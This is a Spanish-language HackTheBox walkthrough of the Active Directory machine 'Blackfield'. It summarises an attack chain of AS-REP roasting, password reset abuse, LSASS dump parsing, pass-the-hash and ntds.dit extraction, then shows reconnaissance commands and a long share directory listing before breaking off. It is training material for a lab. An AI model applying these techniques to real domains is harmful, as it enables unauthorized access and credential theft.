

#### About Blackfield

### Foothold

Blackfield es una máquina de dificultad `hard` en la plataforma HackTheBox. Se trata de un entorno basado en Directorio Activo, donde comenzamos analizando un recurso compartido a nivel de red expuesto a través de SMB. Este recurso compartido alberga una amplia variedad de directorios que parecen corresponder a nombres de usuario. Copiamos todos estos nombres de directorios y procedimos a enumerar si algunos de ellos están asociados a usuarios del sistema. Encontramos tres usuarios válidos, uno de los cuales resulta vulnerable a un ataque de ASREP Roast.

Obtuvimos el Ticket Granting Ticket (TGT) del usuario en cuestión, lo desciframos con éxito y obtuvimos credenciales válidas para el usuario `Support`.

Luego, lanzamos la herramienta `bloodhound-python` para realizar un escaneo exhaustivo del Domain Controller y, en general, de todo el entorno del Directorio Activo. Gracias a este escaneo, identificamos una vulnerabilidad que nos permite cambiar la contraseña del usuario `audit2020` aprovechando el atributo `ForceChangePassword` que tenemos sobre él.

### Shell as svc_backup

Luego de cambiar con éxito la contraseña del usuario `audit2020`, logramos obtener acceso a un recurso compartido a nivel de red a través de SMB. Este recurso compartido alberga información crítica, como un volcado de memoria del proceso LSASS. Utilizando la herramienta `pypykatz`, pudimos realizar un volcado (dump) del LSASS y obtener credenciales en formato de hash NT para el usuario `svc_backup`.

Afortunadamente, el usuario `svc_backup` es miembro del grupo `Remote Management Users`, lo que nos permite utilizar sus credenciales (mediante la técnica PassTheHash utilizando el hash NT) para acceder al servicio WinRM. Utilizando la herramienta `Evil-WinRM`, logramos establecer una conexión remota y obtener una consola remota en el sistema.

### Shell as Administrator

  
Como usuario `svc_backup`, disponemos del privilegio `SeBackupPrivilege`, que nos permite crear copias de seguridad de cualquier archivo del sistema, independientemente de si se requieren privilegios de Administrador. Utilizando la herramienta DiskShadow, creamos una "shadow copy" de la estructura raíz del sistema en una unidad lógica. Luego, mediante el comando `robocopy`, creamos una copia del archivo `ntds.dit` y del registro del sistema. Estos archivos nos permiten realizar un volcado (dump) y obtener los hashes NT de todos los usuarios a nivel de dominio, lo que finalmente nos otorga acceso como administrador.




```
Machine: Blackfield
Difficult: Hard
Platform: HackTheBox
Release: Released on 06/06/2020
```

### Reconocimiento 


Antes de iniciar cualquier proceso de explotación, es fundamental adquirir un conocimiento completo de la superficie de ataque, que incluye servicios, tecnologías, sistemas, entre otros aspectos relevantes. Es imperativo destacar que realizar una enumeración exhaustiva constituye un componente crítico, ya que proporciona una base sólida para el éxito en la posterior explotación de los servicios expuestos por la máquina objetivo.

En primer lugar, es esencial realizar un escaneo para determinar qué puertos se encuentran accesibles en la máquina objetivo, ya que son estos puertos los que actúan como puntos de entrada para los servicios expuestos por la misma. 

```
elswix@kali$ sudo nmap -p- --open -sS --min-rate 5000 -v -n -Pn 10.10.10.192 -oG portScan 

PORT     STATE SERVICE        REASON
53/tcp   open  domain         syn-ack ttl 127
88/tcp   open  kerberos-sec   syn-ack ttl 127
135/tcp  open  msrpc          syn-ack ttl 127
389/tcp  open  ldap           syn-ack ttl 127
445/tcp  open  microsoft-ds   syn-ack ttl 127
593/tcp  open  http-rpc-epmap syn-ack ttl 127
3268/tcp open  globalcatLDAP  syn-ack ttl 127
5985/tcp open  wsman          syn-ack ttl 127
```

A primera vista, parece que nos encontramos ante un entorno que utiliza Active Directory. Esta suposición se basa en la presencia de puertos típicamente asociados a entornos de Active Directory, como el puerto 88 (donde suele alojarse el servicio Kerberos), el puerto 389 (donde generalmente reside el servicio LDAP) y el puerto 135 (que suele albergar el servicio RPC).

A continuación, procederemos con un escaneo exhaustivo con el fin de identificar las tecnologías, servicios y versiones que se ejecutan en estos puertos, lo que contribuirá al reconocimiento detallado del entorno.

```
elswix@kali$ nmap -sCV -p53,88,135,389,445,593,3268,5985 10.10.10.192 -oN fullScan -Pn

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-20 20:09:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```


En un primer paso, se nos proporciona información relevante, como el nombre de dominio.

Procederé a agregar el dominio `BLACKFIELD.local` en mi archivo `/etc/hosts`, haciendo referencia a la dirección IP de la máquina víctima:

```
elswix@kali$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	Kali.localhost	Kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

# HackTheBox
10.10.10.192 BLACKFIELD.local
```



### DNS Enumeration 

Para comenzar, iniciaremos la enumeración del servicio DNS que está disponible a través del puerto 53. Para llevar a cabo esta tarea, emplearemos la herramienta `dig`.

```
elswix@kali$ dig @10.10.10.192 BLACKFIELD.local 
; <<>> DiG 9.18.16-1-Debian <<>> @10.10.10.192 BLACKFIELD.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 23258
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;BLACKFIELD.local.		IN	A

;; ANSWER SECTION:
BLACKFIELD.local.	600	IN	A	10.10.10.192

;; Query time: 144 msec
;; SERVER: 10.10.10.192#53(10.10.10.192) (UDP)
;; WHEN: Wed Sep 20 19:58:14 -03 2023
;; MSG SIZE  rcvd: 61
```


###### Name Server

  
Procedemos a enumerar los servidores de nombres (Name Servers):

Este comando utilizará la herramienta `dig` para obtener la información de los servidores de nombres asociados al dominio `BLACKFIELD.local`.

```
elswix@kali$ dig @10.10.10.192 BLACKFIELD.local ns

; <<>> DiG 9.18.16-1-Debian <<>> @10.10.10.192 BLACKFIELD.local ns
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16770
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;BLACKFIELD.local.		IN	NS

;; ANSWER SECTION:
BLACKFIELD.local.	3600	IN	NS	dc01.BLACKFIELD.local.

;; ADDITIONAL SECTION:
dc01.BLACKFIELD.local.	3600	IN	A	10.10.10.192
dc01.BLACKFIELD.local.	3600	IN	AAAA	dead:beef::bdb2:5cba:f7f7:d9fa
dc01.BLACKFIELD.local.	3600	IN	AAAA	dead:beef::219

;; Query time: 144 msec
;; SERVER: 10.10.10.192#53(10.10.10.192) (UDP)
;; WHEN: Wed Sep 20 19:59:10 -03 2023
;; MSG SIZE  rcvd: 136
```


Se nos ha proporcionado información que sugiere la existencia de un subdominio. De inmediato, procederé a agregar este subdominio a mi archivo `/etc/hosts`:

```
elswix@kali$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	Kali.localhost	Kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

# HackTheBox
10.10.10.192 BLACKFIELD.local dc01.BLACKFIELD.local
```

###### Transfer Zone

Cuando intentamos realizar un ataque de Transferencia de Zona, observamos que no es exitoso:

```
elswix@kali$ dig @10.10.10.192 BLACKFIELD.local axfr
; <<>> DiG 9.18.16-1-Debian <<>> @10.10.10.192 BLACKFIELD.local axfr
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

Si bien es posible enumerar los servidores de correo y otros servicios, en este momento esa información no es relevante para nuestros objetivos actuales.



### RPC Enumeration 

  
Ahora, procedemos a enumerar el servicio RPC, que parece permitirnos establecer conexiones sin la necesidad de utilizar credenciales, es decir, nos permite realizar una sesión nula (Null Session):

```
elswix@kali$ rpcclient -U "" 10.10.10.192 -N
rpcclient $> 
```

Al intentar obtener información sobre el Domain Controller (DC), se nos notifica que se ha denegado el acceso. Parece ser que podemos establecer una conexión, pero no tenemos acceso a la información del Domain Controller.

```
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomgroups
result was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```


### SMB Enumeration 

A continuación, iniciaremos la enumeración del servicio SMB, que se encuentra en el puerto 445. Para ello, haremos uso de la herramienta [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec).

```
elswix@kali$ crackmapexec smb 10.10.10.192
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
```

  
La enumeración del servicio SMB no revela información muy relevante. Sin embargo, podemos destacar que el sistema operativo en uso es Windows, más precisamente la versión Windows 10. Además, se proporciona el nombre de host de la máquina, que es `DC01`. A partir de esta información, podemos deducir que estamos conectando directamente al Domain Controller.

Una buena práctica es agregar el HOSTNAME al archivo `/etc/hosts`. 

```
elswix@kali$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	Kali.localhost	Kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

# HackTheBox
10.10.10.192 BLACKFIELD.local DC01 dc01.BLACKFIELD.local
```


##### Recursos compartidos

Normalmente, en empresas que siguen buenas prácticas de seguridad, se requieren credenciales válidas para acceder a estos recursos compartidos. Sin embargo, en algunas ocasiones, las conexiones utilizando una Sesión Nula (Null Session) o una Sesión de Invitado (Guest Session) pueden permitir el acceso a los recursos compartidos sin necesidad de autenticación previa.

En mi caso, optaré por utilizar una Sesión de Invitado, empleando nuevamente [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec).

```
elswix@kali$ crackmapexec smb 10.10.10.192 -u "elswix" -p "" --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\elswix: 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share 
```

Tenemos acceso a dos recursos compartidos: `profiles$` e `IPC$`. El más relevante de los dos es `profiles$`.

Para llevar a cabo la lectura de los recursos compartidos que ofrece este servicio, utilizaré la herramienta [SmbMap](https://github.com/ShawnDEvans/smbmap).

```
elswix@kali$ smbmap -H 10.10.10.192 -u 'elswix' -r "profiles$"  
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.192:445	Name: BLACKFIELD.local    	Status: Guest session   	
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	profiles$                                         	READ ONLY	
	./profiles$
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	.
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	..
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AAlleni
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ABarteski
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ABekesz
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ABenzies
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ABiemiller
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AChampken
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ACheretei
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ACsonaki
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AHigchens
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AJaquemai
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AKlado
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AKoffenburger
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AKollolli
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AKruppe
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AKubale
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ALamerz
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AMaceldon
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AMasalunga
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ANavay
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ANesterova
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ANeusse
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AOkleshen
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	APustulka
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ARotella
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ASanwardeker
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AShadaia
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ASischo
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ASpruce
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ATakach
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ATaueg
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ATwardowski
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	audit2020
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AWangenheim
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AWorsey
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AZigmunt
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BBakajza
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BBeloucif
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BCarmitcheal
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BConsultant
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BErdossy
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BGeminski
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BLostal
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BMannise
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BNovrotsky
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BRigiero
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BSamkoses
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BZandonella
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CAcherman
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CAkbari
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CAldhowaihi
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CArgyropolous
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CDufrasne
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CGronk
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	Chiucarello
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	Chiuccariello
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CHoytal
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CKijauskas
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CKolbo
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CMakutenas
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CMorcillo
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CSchandall
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CSelters
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CTolmie
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DCecere
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DChintalapalli
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DCwilich
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DGarbatiuc
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DKemesies
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DMatuka
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DMedeme
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DMeherek
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DMetych
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DPaskalev
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DPriporov
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DRusanovskaya
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DVellela
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DVogleson
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DZwinak
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	EBoley
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	EEulau
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	EFeatherling
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	EFrixione
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	EJenorik
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	EKmilanovic
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ElKatkowsky
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	EmaCaratenuto
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	EPalislamovic
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	EPryar
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ESachhitello
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ESariotti
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ETurgano
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	EWojtila
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FAlirezai
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FBaldwind
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FBroj
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FDeblaquire
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FDegeorgio
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FianLaginja
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FLasokowski
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FPflum
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FReffey
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GaBelithe
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	Gareld
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GBatowski
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GForshalger
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GGomane
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GHisek
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GMaroufkhani
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GMerewether
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GQuinniey
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GRoswurm
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GWiegard
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	HBlaziewske
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	HColantino
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	HConforto
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	HCunnally
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	HGougen
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	HKostova
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	IChristijr
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	IKoledo
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	IKotecky
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ISantosi
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JAngvall
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JBehmoiras
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JDanten
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JDjouka
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JKondziola
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JLeytushsenior
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JLuthner
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JMoorehendrickson
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JPistachio
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JScima
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JSebaali
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JShoenherr
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JShuselvt
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KAmavisca
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KAtolikian
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KBrokinn
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KCockeril
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KColtart
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KCyster
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KDorney
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KKoesno
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KLangfur
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KMahalik
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KMasloch
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KMibach
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KParvankova
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KPregnolato
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KRasmor
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KShievitz
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KSojdelius
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KTambourgi
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KVlahopoulos
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KZyballa
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LBajewsky
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LBaligand
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LBarhamand
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LBirer
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LBobelis
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LChippel
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LChoffin
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LCominelli
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LDruge
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LEzepek
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LHyungkim
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LKarabag
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LKirousis
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LKnade
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LKrioua
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LLefebvre
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LLoeradeavilez
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LMichoud
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LTindall
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LYturbe
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MArcynski
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MAthilakshmi
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MAttravanam
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MBrambini
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MHatziantoniou
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MHoerauf
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MKermarrec
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MKillberg
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MLapesh
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MMakhsous
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MMerezio
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MNaciri
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MShanmugarajah
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MSichkar
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MTemko
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MTipirneni
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MTonuri
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MVanarsdel
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NBellibas
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NDikoka
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NGenevro
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NGoddanti
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NMrdirk
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NPulido
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NRonges
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NSchepkie
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NVanpraet
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	OBelghazi
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	OBushey
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	OHardybala
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	OLunas
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ORbabka
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PBourrat
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PBozzelle
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PBranti
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PCapperella
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PCurtz
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PDoreste
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PGegnas
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PMasulla
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PMendlinger
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PParakat
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PProvencer
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PTesik
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PVinkovich
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PVirding
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PWeinkaus
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RBaliukonis
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RBochare
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RKrnjaic
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RNemnich
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RPoretsky
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RStuehringer
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RSzewczuga
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RVallandas
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RWeatherl
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RWissor
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SAbdulagatov
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SAjowi
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SAlguwaihes
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SBonaparte
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SBouzane
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SChatin
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SDellabitta
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SDhodapkar
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SEulert
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SFadrigalan
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SGolds
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SGrifasi
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SGtlinas
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SHauht
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SHederian
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SHelregel
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SKrulig
